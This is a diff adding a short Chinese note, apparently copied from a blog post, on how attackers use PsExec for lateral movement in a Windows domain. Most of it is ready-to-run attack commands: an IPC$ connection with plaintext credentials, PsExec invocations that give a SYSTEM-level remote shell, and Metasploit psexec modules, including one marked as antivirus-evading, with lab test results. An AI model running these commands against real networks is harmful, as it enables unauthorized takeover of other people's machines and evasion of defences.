@@ -1,0 +1,26 @@
+https://zhuanlan.zhihu.com/p/228742108PsExec
+是一款功能强大的软件，起初主要用于大批量Windows主机的运维，在域内效果不错。但是，攻击者逐渐开始使用PsExec，通过命令行环境和目标机器进行连接，甚至控制目标机器，而不需要通过RDP远程桌面协议进行图形化控制，很好的隐藏了黑客活动
+
+1、PsTools工具包中的PsExec
+https://docs.microsoft.com/en-us/sysinternals/downloads/pstools
+第一步：建立IPC$管道
+
+net use \\192.168.160.135\ipc$ "W2ngluoanquan" /user:HACKBIJI\Administrator
+
+第二步：通过PsExec.exe获得远程系统的控制权
+-accepteula 确保不会弹出确认对话框-s 获取系统权限（System）
+.\PsExec.exe -accepteula \\192.168.160.135 -s cmd.exe
+
+如果不添加-s参数，那么获得的是管理员权限
+
+如果没有提前建立好IPC$，PsExec也可以通过指定账号和密码的方式，进行远程连接。
+.\PsExec.exe \\192.168.160.135 -u HACKBIJI\ailx00 -p WoShi@Ailx10 cmd.exe 
+
+
+
+2、metasploit中的psexec模块
+kali-->win7 域用户测试失败（不支持win7）
+模块（免杀）：use exploit/windows/smb/psexec_psh 
+kali-->windows server 2012 域用户测试成功
+模块：use exploit/windows/smb/psexec 
+kali-->windows server 2012 域用户测试成功
